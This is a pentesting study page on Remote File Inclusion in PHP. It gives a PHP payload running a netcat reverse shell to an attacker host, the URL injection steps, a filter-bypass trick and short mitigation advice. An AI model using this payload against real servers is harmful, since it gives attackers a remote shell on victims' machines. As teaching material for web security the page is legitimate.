---
title: RFI attack - Remote File Inclusion
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - web pentesting
---

# RFI attack - Remote File Inclusion

## Tools and payloads 

- See updated chart: [Attacks and tools for web pentesting](web-exploitation.md).


## php 

In php.ini file there are some parameters that define this policy:

+ allow_url_fopen
+ allow_url_include

If these functions are enabled (set to ON), then a [LFI](local-file-inclusion-lfi.md) can turned into a Remote File Inclusion. 

**1.** Create a php file with the remote shell

```bash
nano reverse.txt
```

**2.**  In that php file, craft malicious code

```php
<?php
passthru("nc -e /bin/sh <attacker IP> <attacker port>") 
php ?>

```
**3.** Serve that file from you machine (http_serve).

**4.** Get your machine listening in a port with netcat.

**5.** In the injection point from where you can make a call to a URL, serve your file. For instance:

```
https:\\VICTIMurlADDRESS/PATH/PATH/page=http://<attackerip>/reverse.txt

# Sometimes to get php executed on the victim machin (and not the attacker), add an ?
https:\\VICTIMurlADDRESS/PATH/PATH/page=http://<attackerip>/reverse.txt?
```

Sometimes there might be some filtering for the payload (which was: 

```
http://<attackerip>/reverse.txt?). 
````

To bypass it:

```
# using uppercase
https:\\VICTIMurlADDRESS/PATH/PATH/page=hTTP://<attackerip>/reverse.txt

# Other bypassing techniques for slashes
```



## Mitigation

In php.ini disallow:

+ allow_url_fopen
+ allow_url_include

User static file inclusion (instead of dynamic file inclusion) by harcoding the files you want to include and not get them using GET or POST methods. 